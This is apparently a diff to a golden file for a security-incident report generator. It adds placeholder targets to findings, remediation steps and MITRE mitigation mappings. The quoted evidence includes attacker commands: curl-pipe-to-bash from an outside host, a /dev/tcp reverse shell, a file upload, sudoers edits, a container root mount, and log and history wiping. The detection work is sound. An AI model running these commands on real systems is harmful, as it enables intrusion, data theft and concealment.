@@ -264,7 +264,7 @@ _collected: first seen in an output; used: first seen in a script; a secret is m
 
 - **\[x\] high** · `Privileged access obtained`
   - A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.
-  - **targets:** `file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host`
+  - **targets:** `file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host`
   - **what:** `SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)`
   - **what:** `SetuidBit: chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)`
   - **what:** `ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)`
@@ -281,7 +281,7 @@ _collected: first seen in an output; used: first seen in a script; a secret is m
   - **basis:** `ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password`
 - **\[x\] high** · `Persistence established`
   - A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.
-  - **targets:** `unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc`
+  - **targets:** `runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE`
   - **what:** `ScheduledJobCreation: (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)`
   - **what:** `ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)`
   - **what:** `SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)`
@@ -304,7 +304,7 @@ _collected: first seen in an output; used: first seen in a script; a secret is m
   - **basis:** `FileUpload, Exfiltration tools`
 - **\[x\] high** · `Outside hosts contacted`
   - Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 198.51.100.7, 203.0.113.40, 203.0.113.41.
-  - **targets:** `url http://203.0.113.40/s.sh; host 203.0.113.41 ($H)`
+  - **targets:** `url http://203.0.113.40/s.sh; host 203.0.113.41 ($H); port $PORT`
   - **what:** `ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)`
   - **what:** `ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)`
   - **basis:** `ShellDownloadAndExecute, ReverseShell`
@@ -329,6 +329,7 @@ _collected: first seen in an output; used: first seen in a script; a secret is m
   - **basis:** `ShellDownloadAndExecute`
 - **\[!\] medium** · `Traces hidden`
   - Files or history were removed or disguised. What is left on the host is incomplete.
+  - **targets:** `file $F`
   - **what:** `HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)`
   - **what:** `Timestomp: touch -r /bin/ls "$F" (20261022_092000_step05_evade.sh:8)`
   - **basis:** `HistoryClearing, Timestomp`
@@ -368,7 +369,7 @@ _most urgent first_
   - **basis:** `ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password`
 - **\[x\] high** · `Remove persistence`
   - Delete the scheduled jobs, services, accounts, keys and start-up entries that were created, and the files they start.
-  - **targets:** `unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc`
+  - **targets:** `runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE`
   - **what:** `ScheduledJobCreation: (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)`
   - **what:** `ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)`
   - **what:** `SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)`
@@ -379,7 +380,7 @@ _most urgent first_
   - **basis:** `ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools`
 - **\[x\] high** · `Undo privilege changes on hosts`
   - Put sudo rules, file modes and container settings back to their approved state, and treat the host as held at root until rebuilt.
-  - **targets:** `file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host`
+  - **targets:** `file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host`
   - **what:** `SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)`
   - **what:** `SetuidBit: chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)`
   - **what:** `ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)`
@@ -394,7 +395,7 @@ _most urgent first_
   - **basis:** `SecurityToolDisabling, FirewallDisabling`
 - **\[x\] high** · `Block and hunt the infrastructure`
   - Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.
-  - **targets:** `url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H)`
+  - **targets:** `url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H); port $PORT`
   - **what:** `ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)`
   - **what:** `FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)`
   - **what:** `ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)`
@@ -414,7 +415,7 @@ _most urgent first_
   - **basis:** `ShellDownloadAndExecute`
 - **\[!\] medium** · `Recover the missing logs`
   - Treat local logs as incomplete, and recover the period from a central collector or a backup.
-  - **targets:** `log /var/log/auth.log; setting HISTFILE`
+  - **targets:** `log /var/log/auth.log; setting HISTFILE; file $F`
   - **what:** `LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)`
   - **what:** `HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)`
   - **what:** `HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)`
@@ -444,27 +445,29 @@ _MITRE ATT&amp;CK and ATLAS, for the techniques found_
 - **\[x\] high** · `M1018 User Account Management` · `T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686`
   - User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.
   - **for:** `FileUpload: url https://files.example.net/up, file out.tgz`
+  - **for:** `ScheduledJobCreation: runs $JOB`
   - **for:** `SshKeyPersistence: file ~/.ssh/authorized_keys`
   - **for:** `SystemdUnitCreation: unit sync.service`
   - **for:** `SecurityToolDisabling: service auditd`
 - **\[x\] high** · `M1022 Restrict File and Directory Permissions` · `T1048, T1053.006, T1070.003, T1098.004, T1543.002, T1546.004, T1548.003, T1552.001, T1552.004, T1685, T1685.006, T1686`
   - Restricting file and directory permissions involves setting access controls at the file system level to limit which users, groups, or processes can read, write, or execute files.
   - **for:** `FileUpload: url https://files.example.net/up, file out.tgz`
+  - **for:** `ScheduledJobCreation: runs $JOB`
   - **for:** `SshKeyPersistence: file ~/.ssh/authorized_keys`
   - **for:** `SystemdUnitCreation: unit sync.service`
-  - **for:** `ShellProfilePersistence: file ~/.bashrc`
-  - **for:** `SudoersModification: file /etc/sudoers.d/svc`
-  - **for:** `CredentialFileRead: file ~/.aws/credentials`
-  - **for:** `and 3 more in report.json`
+  - **for:** `ShellProfilePersistence: file ~/.bashrc, adds $LINE`
+  - **for:** `SudoersModification: file /etc/sudoers.d/svc, rule $RULE`
+  - **for:** `and 4 more in report.json`
 - **\[x\] high** · `M1024 Restrict Registry Permissions` · `T1685, T1686`
   - Restricting registry permissions involves configuring access control settings for sensitive registry keys and hives to ensure that only authorized users or processes can make modifications.
   - **for:** `SecurityToolDisabling: service auditd`
 - **\[x\] high** · `M1026 Privileged Account Management` · `T1003.008, T1053.002, T1053.006, T1136.001, T1543.002, T1548.003, T1552.007, T1611`
   - Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).
   - **for:** `ShadowFileRead: file /etc/shadow`
+  - **for:** `ScheduledJobCreation: runs $JOB`
   - **for:** `AccountCreation: account svc`
   - **for:** `SystemdUnitCreation: unit sync.service`
-  - **for:** `SudoersModification: file /etc/sudoers.d/svc`
+  - **for:** `SudoersModification: file /etc/sudoers.d/svc, rule $RULE`
   - **for:** `ContainerEscape: mount /:/host`
 - **\[x\] high** · `M1027 Password Policies` · `T1003.008, T1552.001, T1552.004`
   - Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.
@@ -473,8 +476,9 @@ _MITRE ATT&amp;CK and ATLAS, for the techniques found_
   - **for:** `PrivateKeyRead: file ~/.ssh/id_rsa`
 - **\[x\] high** · `M1028 Operating System Configuration` · `T1053.002, T1548.001, T1548.003, T1552.003, T1690`
   - Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.
+  - **for:** `ScheduledJobCreation: runs $JOB`
   - **for:** `SetuidBit: file /tmp/tool ($F)`
-  - **for:** `SudoersModification: file /etc/sudoers.d/svc`
+  - **for:** `SudoersModification: file /etc/sudoers.d/svc, rule $RULE`
   - **for:** `ShellHistoryRead: file ~/.bash_history`
   - **for:** `HistoryDisabling: setting HISTFILE`
 - **\[x\] high** · `M1029 Remote Data Storage` · `T1070.003, T1685.006`
@@ -483,11 +487,11 @@ _MITRE ATT&amp;CK and ATLAS, for the techniques found_
 - **\[x\] high** · `M1030 Network Segmentation` · `T1048, T1095, T1552.007`
   - Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.
   - **for:** `FileUpload: url https://files.example.net/up, file out.tgz`
-  - **for:** `ReverseShell: host 203.0.113.41 ($H)`
+  - **for:** `ReverseShell: host 203.0.113.41 ($H), port $PORT`
 - **\[x\] high** · `M1031 Network Intrusion Prevention` · `T1048, T1095, T1105`
   - Use intrusion detection signatures to block traffic at network boundaries.
   - **for:** `FileUpload: url https://files.example.net/up, file out.tgz`
-  - **for:** `ReverseShell: host 203.0.113.41 ($H)`
+  - **for:** `ReverseShell: host 203.0.113.41 ($H), port $PORT`
   - **for:** `ShellDownloadAndExecute: url http://203.0.113.40/s.sh`
 - **\[x\] high** · `M1032 Multi-factor Authentication` · `T1136.001`
   - Multi-Factor Authentication (MFA) enhances security by requiring users to provide at least two forms of verification to prove their identity before granting access.
@@ -501,13 +505,13 @@ _MITRE ATT&amp;CK and ATLAS, for the techniques found_
 - **\[x\] high** · `M1037 Filter Network Traffic` · `T1048, T1095, T1105, T1552.005`
   - Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic.
   - **for:** `FileUpload: url https://files.example.net/up, file out.tgz`
-  - **for:** `ReverseShell: host 203.0.113.41 ($H)`
+  - **for:** `ReverseShell: host 203.0.113.41 ($H), port $PORT`
   - **for:** `ShellDownloadAndExecute: url http://203.0.113.40/s.sh`
   - **for:** `CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/`
 - **\[x\] high** · `M1038 Execution Prevention` · `T1059.004, T1611, T1685`
   - Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms.
   - **for:** `ShellDownloadAndExecute: url http://203.0.113.40/s.sh`
-  - **for:** `ReverseShell: host 203.0.113.41 ($H)`
+  - **for:** `ReverseShell: host 203.0.113.41 ($H), port $PORT`
   - **for:** `ContainerEscape: mount /:/host`
   - **for:** `SecurityToolDisabling: service auditd`
 - **\[x\] high** · `M1039 Environment Variable Permissions` · `T1070.003, T1690`
@@ -525,7 +529,8 @@ _MITRE ATT&amp;CK and ATLAS, for the techniques found_
   - **for:** `SecurityToolDisabling: service auditd`
 - **\[x\] high** · `M1047 Audit` · `T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686`
   - Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.
-  - **for:** `ReverseShell: host 203.0.113.41 ($H)`
+  - **for:** `ScheduledJobCreation: runs $JOB`
+  - **for:** `ReverseShell: host 203.0.113.41 ($H), port $PORT`
   - **for:** `CredentialFileRead: file ~/.aws/credentials`
   - **for:** `PrivateKeyRead: file ~/.ssh/id_rsa`
   - **for:** `ArchiveCreation: archive out.tgz`
@@ -548,12 +553,12 @@ _MITRE ATT&amp;CK and ATLAS, for the techniques found_
 - **\[x\] high** · `AML.M0011 Restrict Library Loading` · `AML.T0050, AML.T0090, AML.T0142`
   - Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.
   - **for:** `ShellDownloadAndExecute: url http://203.0.113.40/s.sh`
-  - **for:** `ReverseShell: host 203.0.113.41 ($H)`
+  - **for:** `ReverseShell: host 203.0.113.41 ($H), port $PORT`
   - **for:** `ShadowFileRead: file /etc/shadow`
-  - **for:** `ShellProfilePersistence: file ~/.bashrc`
+  - **for:** `ShellProfilePersistence: file ~/.bashrc, adds $LINE`
 - **\[x\] high** · `AML.M0013 Code Signing` · `AML.T0142`
   - Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.
-  - **for:** `ShellProfilePersistence: file ~/.bashrc`
+  - **for:** `ShellProfilePersistence: file ~/.bashrc, adds $LINE`
 - **\[x\] high** · `AML.M0043 AI Agent External Resource Lifecycle Management` · `AML.T0072, AML.T0125`
   - Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.
   - **for:** `ShellDownloadAndExecute: url http://203.0.113.40/s.sh`
